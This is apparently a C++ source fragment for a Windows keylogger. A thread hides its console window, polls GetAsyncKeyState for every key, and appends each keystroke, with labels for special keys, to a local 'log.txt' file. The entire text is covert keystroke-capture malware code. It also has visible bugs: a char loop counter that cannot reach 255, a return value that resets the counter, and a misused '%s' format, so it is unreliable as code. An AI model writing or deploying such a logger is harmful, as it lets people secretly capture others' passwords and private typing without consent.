int save(int key, char const *file){
	//std::cout << key << std::endl;

	Sleep(10);

	FILE *output;

	output = fopen(file, "a+");

	if (key == VK_SHIFT){
		fprintf(output, "%s", "[SHIFT]");
	}else if (key == VK_BACK){
		fprintf(output, "%s", "[BACK]");
	}else if (key == VK_LBUTTON){
		fprintf(output, "%s", "[LEFT MOUSE]");
	}else if (key == VK_RBUTTON){
		fprintf(output, "%s", "[RIGHT MOUSE BUTTON]");
	}else if (key == VK_CANCEL){
		fprintf(output, "%s", "[BREAK CONTROL]");
	}else if (key == VK_TAB){
		fprintf(output, "%s", "[TAB]");
	}else if (key == VK_RETURN){
		fprintf(output, "%s", "[ENTER]");
	}else if (key == VK_ESCAPE){
		fprintf(output, "%s", "[ESCAPE]");
	}else if (key == VK_CAPITAL){
		fprintf(output, "%s", "[CAPS LOCK]");
	}else if (key == VK_SPACE){
		fprintf(output, "%s", "[SPACE]");
 	}else if (key == VK_UP){
		fprintf(output, "%s", "[UP ARROW]");
	}else if (key == VK_DOWN){
		fprintf(output, "%s", "[DOWN ARROW]");
	}else if (key == VK_LEFT){
		fprintf(output, "%s", "[LEFT ARROW]");
	}else if (key == VK_RIGHT){
		fprintf(output, "%s", "[RIGHT ARROW]");
	}else if (key == VK_BROWSER_BACK){
		fprintf(output, "%s", "[BROWSER BACK]");
	}else if (key == VK_BROWSER_FORWARD){
		fprintf(output, "%s", "BROWSER FORWARD");
	}else if (key == VK_BROWSER_REFRESH){
		fprintf(output, "%s", "[BROWSER REFRESH]");
	}else if (key == VK_BROWSER_STOP){
		fprintf(output, "%s", "[BROWSER STOP]");
	}else if (key == VK_BROWSER_SEARCH){
		fprintf(output, "%s", "[BROWSER SEARCH KEY]");
	}else if (key == VK_BROWSER_HOME){
		fprintf(output, "%s", "[BROWSER START/HOME]");
	}else if (key == VK_LAUNCH_APP1){
		fprintf(output, "%s", "[APP LAUNCH 1]");
	}else if (key == VK_LAUNCH_APP2){
		fprintf(output, "%s", "[APP LAUNCH 2]");
	}else if (key == VK_LWIN){
		fprintf(output, "%s", "L WIN");
	}else if (key == VK_RWIN){
		fprintf(output, "%s", "R WIN");
	}else if (key == VK_APPS){
		fprintf(output, "%s", "[APPS]");
	}else{
		fprintf(output, "%s", &key);
	}
	fclose(output);

	return 0;
}

DWORD WINAPI keylogger(){
	FreeConsole();
	char i;
	while(true){
		Sleep(10);
		for (i = 8; i <= 255; i++)
		{
			if(GetAsyncKeyState(i) == -32767){
				i = save(i, "log.txt");
			}
		}
	}

	return 0;
}

